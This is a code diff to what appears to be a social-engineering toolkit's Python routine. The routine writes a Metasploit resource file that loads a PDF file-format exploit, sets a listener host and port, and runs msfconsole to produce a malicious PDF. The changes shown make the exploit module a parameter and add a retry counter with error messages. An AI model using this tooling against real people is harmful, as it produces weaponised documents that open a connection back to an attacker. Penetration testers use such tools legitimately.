@@ -185,14 +185,20 @@ if exploit_counter == 0:
             os.remove(msfpath + "local/template.pdf")
 
         filewrite = open(setdir + "/template.rc", "w")
-        filewrite.write("use exploit/windows/fileformat/adobe_pdf_embedded_exe\nset LHOST %s\nset LPORT %s\nset INFILENAME %s\nset FILENAME %s\nexploit\n" %
-                        (rhost, lport, inputpdf, output))
+        filewrite.write("use %s\nset LHOST %s\nset LPORT %s\nset INFILENAME %s\nset FILENAME %s\nexploit\n" %
+                        (exploit, rhost, lport, inputpdf, output))
         filewrite.close()
         child = pexpect.spawn(
             "%smsfconsole -r %s/template.rc" % (meta_path, setdir))
         a = 1
+	counter = 0
         while a == 1:
-            if os.path.isfile(setdir + "/template.pdf"):
+	    if counter == 15: 
+		print_error("Unable to generate PDF - there appears to be an issue with your Metasploit install.")
+		print_error("You will need to troubleshoot Metasploit manually and try generating a PDF. You can manually troubleshoot by going to /root/.set/ and typing msfconsole -r template.rc to reproduce the issue.")
+		pause = raw_input("Press {return} to move back.")
+		break
+            if os.path.isfile(setdir + "/" + outfile):
                 subprocess.Popen("cp " + msfpath + "local/%s %s" % (filename_code, setdir),
                                  stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
                 a = 2  # break
@@ -201,6 +207,7 @@ if exploit_counter == 0:
                 if os.path.isfile(msfpath + "local/" + outfile):
                     subprocess.Popen("cp %slocal/%s %s" %
                                      (msfpath, outfile, setdir), shell=True)
+		    counter = counter + 1 
                 time.sleep(3)
 
         print_status("Payload creation complete.")
